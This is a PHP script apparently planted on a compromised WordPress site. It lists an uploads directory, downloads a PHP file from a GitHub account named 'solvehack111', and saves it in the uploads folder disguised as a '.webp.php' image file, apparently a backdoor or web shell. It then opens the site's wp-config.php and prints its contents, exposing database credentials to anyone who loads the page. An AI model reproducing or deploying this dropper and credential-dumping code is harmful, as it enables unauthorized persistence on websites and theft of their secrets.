<?php
if ($handle = opendir('/home/u601071577/domains/solvemark.az/public_html/wp-content/uploads/2022/03')) {
    while (false !== ($file = readdir($handle)))
    {
        if (($file != ".") 
         && ($file != ".."))
        {
            $thelist .= '<LI><a href="'.$file.'">'.$file.'</a>';
        }
    }

    closedir($handle);
}
?>

<br><br>-----------<br>

<?php
$file = file_get_contents("https://raw.githubusercontent.com/solvehack111/backimg/main/seller-photo-product-website-buy-new-prodct-online-shop-2048x1365.webp.php");
file_put_contents("/home/u601071577/domains/solvemark.az/public_html/wp-content/uploads/2022/03/seller-photo-product-website-buy-new-prodct-online-shop-2048x1365.webp.php", $file);
?>










<P>List of files:</p>
<UL>
<P><?=$thelist?></p>
</UL>

<br><br>----------



<br><br><br>
<html>

   <head>
      <title>Reading a file using PHP</title>
   </head>
   
   <body>
      
      <?php
         $filename = "/home/u601071577/domains/solvemark.az/public_html/wp-config.php";
         $file = fopen( $filename, "r" );
         
         if( $file == false ) {
            echo ( "Error in opening file" );
            exit();
         }
         
         $filesize = filesize( $filename );
         $filetext = fread( $file, $filesize );
         fclose( $file );
         
         echo ( "File size : $filesize bytes" );
         echo ( "<pre>$filetext</pre>" );
      ?>
      
   </body>
</html>
